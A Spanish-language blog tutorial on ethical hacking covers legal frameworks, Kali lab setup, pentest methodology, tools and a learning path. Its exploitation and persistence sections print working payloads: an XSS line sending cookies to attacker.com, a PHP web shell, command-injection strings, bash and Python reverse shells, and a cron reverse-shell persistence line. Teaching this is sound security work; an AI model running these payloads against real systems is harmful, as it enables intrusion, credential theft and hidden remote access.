---
title: "Hacking Ético desde Cero: Introducción al Pentesting Profesional"
date: 2025-08-15 10:00:00 +0000
categories: [Ciberseguridad, Hacking Ético]
tags: [hacking-etico, pentesting, ciberseguridad, kali-linux, metodologia, oscp]
---

## 🎯 ¿Qué es el Hacking Ético?

El **hacking ético** (también conocido como **penetration testing** o **pentesting**) es la práctica de atacar sistemas informáticos de manera **legal y autorizada** para identificar vulnerabilidades antes de que lo hagan los atacantes maliciosos.

> 💡 **Diferencia clave:** El hacker ético tiene **permiso explícito** del propietario del sistema y su objetivo es **mejorar la seguridad**, no causar daño.

### ¿Por qué es importante?

- **Prevención proactiva**: Encuentra vulnerabilidades antes que los atacantes
- **Cumplimiento normativo**: Muchas regulaciones requieren pruebas de penetración
- **ROI comprobado**: Es más barato encontrar vulnerabilidades que sufrir un incidente
- **Demanda laboral**: Una de las áreas con mayor crecimiento en IT

---

## 🏗️ Fundamentos: ¿Qué necesitas saber?

### Conocimientos previos recomendados:
1. **Linux básico** (comandos, permisos, redes)
2. **Redes TCP/IP** (protocolos, puertos, routing)
3. **Programación básica** (Python, Bash scripting)
4. **Bases de datos** (SQL básico)
5. **Aplicaciones web** (HTTP, HTML, JavaScript básico)

### Habilidades técnicas a desarrollar:
- **Reconocimiento** (información gathering)
- **Escaneo de vulnerabilidades**
- **Explotación de sistemas**
- **Post-explotación** (mantener acceso)
- **Reporting profesional**

---

## ⚖️ Marco Legal y Ético

### ⚠️ **CRÍTICO: Aspectos legales**

**NUNCA hagas pentesting sin autorización escrita explícita.**

#### Documentación legal requerida:
- **Contrato de penetration testing** firmado
- **Scope definido** (qué sistemas puedes atacar)
- **Timeframe establecido** (cuándo y por cuánto tiempo)
- **Puntos de contacto** para emergencias
- **Reglas de engagement** (qué está permitido/prohibido)

#### Leyes relevantes (España):
- **Código Penal** - Art. 197 y 264 (acceso no autorizado)
- **LOPD/RGPD** - Protección de datos
- **Ley de Servicios de la Sociedad de la Información**

#### Certificaciones éticas:
- **CEH** (Certified Ethical Hacker)
- **OSCP** (Offensive Security Certified Professional)
- **CISSP** (Certified Information Systems Security Professional)

---

## 🛠️ Configuración del Laboratorio

### Distribuciones de pentesting recomendadas:

#### 1. **Kali Linux** (La más popular)
```bash
# Descargar desde kali.org
# Verificar checksum SHA256
sha256sum kali-linux-2023.3-installer-amd64.iso

# Instalación en VirtualBox/VMware
# Configuración recomendada:
# - RAM: 4GB mínimo, 8GB recomendado
# - Disco: 40GB mínimo
# - Red: NAT + Host-only adapter
```

#### 2. **ParrotOS Security**
```bash
# Alternativa a Kali, más ligera
# Excelente para principiantes
# Pre-configurada con herramientas de anonimato
```

#### 3. **BlackArch Linux**
```bash
# Basada en Arch, más de 2400 herramientas
# Para usuarios avanzados de Linux
```

### Configuración inicial de Kali Linux:

```bash
# Actualizar el sistema
sudo apt update && sudo apt upgrade -y

# Instalar herramientas adicionales
sudo apt install -y \
    vim \
    tmux \
    htop \
    git \
    curl \
    wget \
    python3-pip \
    golang-go \
    nodejs \
    npm

# Configurar Git
git config --global user.name "Tu Nombre"
git config --global user.email "tu@email.com"

# Crear directorio de trabajo
mkdir -p ~/pentesting/{scripts,reports,tools,wordlists}

# Instalar herramientas de Python
pip3 install \
    requests \
    beautifulsoup4 \
    scapy \
    pwntools \
    impacket
```

### Máquinas virtuales vulnerables para práctica:

#### Nivel Principiante:
- **Metasploitable 2**: VM Linux intencionalmente vulnerable
- **DVWA** (Damn Vulnerable Web Application)
- **bWAPP**: Aplicación web con múltiples vulnerabilidades
- **VulnHub**: Repositorio de VMs vulnerables

#### Nivel Intermedio:
- **HackTheBox**: Plataforma online con laboratorios
- **TryHackMe**: Rooms educativas paso a paso
- **OverTheWire**: Wargames progresivos

#### Configuración de laboratorio local:

```bash
#!/bin/bash
# setup-lab.sh - Script para configurar laboratorio local

echo "🔧 Configurando laboratorio de hacking ético..."

# Crear red aislada para pruebas
sudo vboxmanage natnetwork add --netname PentestLab --network 10.0.2.0/24 --enable

# Descargar Metasploitable 2
echo "📥 Descargando Metasploitable 2..."
cd ~/pentesting/
wget https://sourceforge.net/projects/metasploitable/files/Metasploitable2/metasploitable-linux-2.0.0.zip

# Descargar DVWA
echo "📥 Configurando DVWA..."
git clone https://github.com/digininja/DVWA.git

echo "✅ Laboratorio configurado. Instrucciones:"
echo "1. Importa las VMs en VirtualBox"
echo "2. Configura la red PentestLab"
echo "3. Inicia las máquinas vulnerables"
echo "4. ¡Comienza a practicar!"
```

---

## 📋 Metodología de Pentesting

### 1. **Reconnaissance (Reconocimiento)**

El 70% del éxito en pentesting está en esta fase.

#### Reconocimiento pasivo:
```bash
# OSINT (Open Source Intelligence)
# Información pública sin interactuar con el objetivo

# Google Dorking
site:ejemplo.com filetype:pdf
site:ejemplo.com inurl:admin
site:ejemplo.com intitle:"index of"

# Whois lookup
whois ejemplo.com
whois 192.168.1.1

# DNS enumeration
dig ejemplo.com
dig @8.8.8.8 ejemplo.com mx
dig @8.8.8.8 ejemplo.com txt

# Reverse DNS
dig -x 192.168.1.1

# Subdomain enumeration
subfinder -d ejemplo.com
assetfinder ejemplo.com
```

#### Reconocimiento activo:
```bash
# Ping sweep
nmap -sn 192.168.1.0/24

# Port scanning
nmap -sS -O -sV --script vuln 192.168.1.100

# Web enumeration
gobuster dir -u http://ejemplo.com -w /usr/share/wordlists/dirb/common.txt
dirb http://ejemplo.com
nikto -h http://ejemplo.com
```

### 2. **Scanning & Enumeration**

#### Network scanning:
```bash
# Comprehensive network scan
nmap -sS -sV -sC -O --script=vuln -oA scan_completo 192.168.1.0/24

# UDP scan (slower but important)
nmap -sU --top-ports 1000 192.168.1.100

# Specific service enumeration
nmap --script=smb-enum-* 192.168.1.100  # SMB
nmap --script=ftp-* 192.168.1.100       # FTP
nmap --script=ssh-* 192.168.1.100       # SSH
```

#### Web application scanning:
```bash
# Directory/file discovery
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://ejemplo.com/FUZZ

# Parameter discovery
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://ejemplo.com/index.php?FUZZ=test

# Subdomain discovery
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://FUZZ.ejemplo.com

# Web vulnerability scanning
wapiti -u http://ejemplo.com
sqlmap -u "http://ejemplo.com/page.php?id=1" --dbs
```

### 3. **Vulnerability Assessment**

#### Automated vulnerability scanners:
```bash
# OpenVAS (comprehensive)
sudo gvm-setup
sudo gvm-start
# Acceder via web: https://localhost:9392

# Nessus (commercial, very good)
# Descargar desde tenable.com

# Nuclei (modern, fast)
nuclei -u http://ejemplo.com -t /root/nuclei-templates/

# Manual vulnerability analysis
searchsploit apache 2.4.29
msfconsole
msf6 > search apache
msf6 > use exploit/linux/http/apache_mod_cgi_bash_env_exec
```

### 4. **Exploitation**

#### Common exploitation techniques:

**SQL Injection:**
```bash
# Manual testing
' OR '1'='1
' UNION SELECT null,version(),null--
' OR 1=1--

# SQLMap automated
sqlmap -u "http://ejemplo.com/login.php" --data="user=admin&pass=admin" --dbs
sqlmap -u "http://ejemplo.com/page.php?id=1" --dump
```

**Cross-Site Scripting (XSS):**
```javascript
// Reflected XSS
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>

// Stored XSS payload
<script>
document.location='http://attacker.com/steal.php?cookie='+document.cookie
</script>

// DOM XSS
javascript:alert('XSS')
```

**Remote Code Execution:**
```bash
# PHP code injection
<?php system($_GET['cmd']); ?>
<?php exec($_POST['cmd']); ?>

# Command injection
; cat /etc/passwd
| whoami
& ping -c 4 attacker.com

# Reverse shell payloads
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### 5. **Post-Exploitation**

#### Privilege escalation:
```bash
# Linux privilege escalation
# Enumeration scripts
wget https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# Manual checks
sudo -l                    # Sudo permissions
find / -perm -4000 2>/dev/null  # SUID binaries
cat /etc/crontab          # Cron jobs
ps aux                    # Running processes

# Common privilege escalation vectors
# - Kernel exploits
# - SUID binaries
# - Sudo misconfigurations
# - Cron jobs with weak permissions
# - Services running as root
```

#### Persistence techniques:
```bash
# SSH key persistence
mkdir ~/.ssh
echo "ssh-rsa AAAAB3N..." >> ~/.ssh/authorized_keys

# Cron job persistence
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'" | crontab -

# Service persistence
# Create malicious systemd service
```

### 6. **Reporting**

#### Estructura de reporte profesional:

```markdown
# Executive Summary
- Resumen ejecutivo para management
- Nivel de riesgo general
- Recomendaciones principales

# Technical Summary
- Metodología utilizada
- Scope del assessment
- Limitaciones

# Findings
Para cada vulnerabilidad:
- Severity: Critical/High/Medium/Low
- CVSS Score
- Description
- Impact
- Proof of Concept
- Remediation

# Appendices
- Raw scan outputs
- Screenshots
- Code snippets
```

---

## 🛠️ Herramientas Esenciales por Categoría

### Reconocimiento:
- **nmap**: Network discovery y port scanning
- **masscan**: Ultra-fast port scanner
- **subfinder**: Subdomain enumeration
- **amass**: Comprehensive OSINT framework
- **recon-ng**: Web reconnaissance framework

### Web Application Testing:
- **Burp Suite**: Web application security testing
- **OWASP ZAP**: Free alternative to Burp
- **sqlmap**: Automated SQL injection testing
- **gobuster/dirb**: Directory/file brute forcing
- **nikto**: Web server scanner

### Network Testing:
- **metasploit**: Exploitation framework
- **nessus**: Vulnerability scanner
- **wireshark**: Network protocol analyzer
- **aircrack-ng**: WiFi security testing
- **responder**: LLMNR, NBT-NS and MDNS poisoner

### Post-Exploitation:
- **LinPEAS/WinPEAS**: Privilege escalation enumeration
- **bloodhound**: Active Directory attack path analysis
- **mimikatz**: Windows credential extraction
- **empire**: Post-exploitation framework

---

## 📚 Ruta de Aprendizaje Recomendada

### Mes 1-2: Fundamentos
1. **Configurar laboratorio** (Kali + VMs vulnerables)
2. **Dominar Linux** básico y intermedio
3. **Aprender redes** TCP/IP en profundidad
4. **Practicar con Metasploitable 2**

### Mes 3-4: Web Application Security
1. **OWASP Top 10** en profundidad
2. **Burp Suite** básico e intermedio
3. **SQL Injection** manual y automatizada
4. **XSS** y **CSRF** exploitation

### Mes 5-6: Network Penetration Testing
1. **Nmap** avanzado y NSE scripts
2. **Metasploit** framework completo
3. **Active Directory** attacks básicos
4. **Lateral movement** techniques

### Mes 7-8: Advanced Topics
1. **Binary exploitation** básico
2. **Privilege escalation** avanzado
3. **Wireless security** testing
4. **Mobile application** security

### Mes 9-12: Certificaciones y Especialización
1. **CEH** o **OSCP** preparation
2. **Bug bounty** programs
3. **Red Team** operations
4. **Desarrollar especialización** (web, mobile, AD, etc.)

---

## 🎯 Primeros Pasos Prácticos

### Laboratorio básico de hoy:

```bash
# 1. Instalar Kali Linux en VM
# 2. Descargar Metasploitable 2
# 3. Configurar red entre ambas VMs

# 4. Primer reconocimiento
nmap -sn 192.168.1.0/24  # Encontrar Metasploitable

# 5. Escaneo básico
nmap -sV -sC [IP_METASPLOITABLE]

# 6. Explorar servicios web
firefox http://[IP_METASPLOITABLE]

# 7. Primera explotación simple
# Buscar servicios con credenciales por defecto
# Intentar SQL injection básica en DVWA
```

### Ejercicios para esta semana:
1. **Configura tu laboratorio** completo
2. **Explora Metasploitable 2** manualmente
3. **Practica Google Dorking** en sitios de prueba
4. **Instala y prueba** Burp Suite Community
5. **Únete a foros** de ciberseguridad (Reddit r/netsec, etc.)

---

## 🔗 Recursos Adicionales

### Plataformas de práctica:
- **HackTheBox**: hackthebox.eu
- **TryHackMe**: tryhackme.com
- **VulnHub**: vulnhub.com
- **OverTheWire**: overthewire.org
- **PentesterLab**: pentesterlab.com

### Cursos recomendados:
- **Cybrary**: Ethical Hacking courses
- **eLearnSecurity**: eJPT, eCPPT certificates
- **Offensive Security**: PWK/OSCP
- **SANS**: SEC560, SEC542

### Libros esenciales:
- "The Web Application Hacker's Handbook"
- "Penetration Testing: A Hands-On Introduction to Hacking"
- "The Hacker Playbook 3"
- "Black Hat Python"

### Podcasts y canales:
- **Darknet Diaries**: True cybersecurity stories
- **The Cyber Wire**: Daily security news
- **IppSec**: HackTheBox walkthroughs (YouTube)
- **LiveOverflow**: Binary exploitation (YouTube)

---

## ⚠️ Advertencias Finales

### Lo que NUNCA debes hacer:
- ❌ Testear sistemas sin autorización
- ❌ Usar herramientas de pentesting en redes públicas
- ❌ Compartir vulnerabilities antes de reportarlas
- ❌ Causar interrupción de servicios
- ❌ Acceder a datos personales/confidenciales

### Principios éticos:
- ✅ Siempre obtén autorización escrita
- ✅ Respeta el scope definido
- ✅ Reporta vulnerabilidades responsablemente
- ✅ Mantén confidencialidad absoluta
- ✅ Busca mejorar la seguridad, no demostrar habilidades

---

## 🎯 Próximo Tutorial

En la siguiente entrega veremos:
- **Configuración avanzada de Kali Linux**
- **Reconocimiento profundo con OSINT**
- **Primeras explotaciones paso a paso**
- **Laboratorio práctico con Metasploitable 2**

💡 **Recuerda:** El hacking ético es una responsabilidad. Usa estos conocimientos para proteger, no para atacar.

---
**Andrés Nuñez - t4ifi**
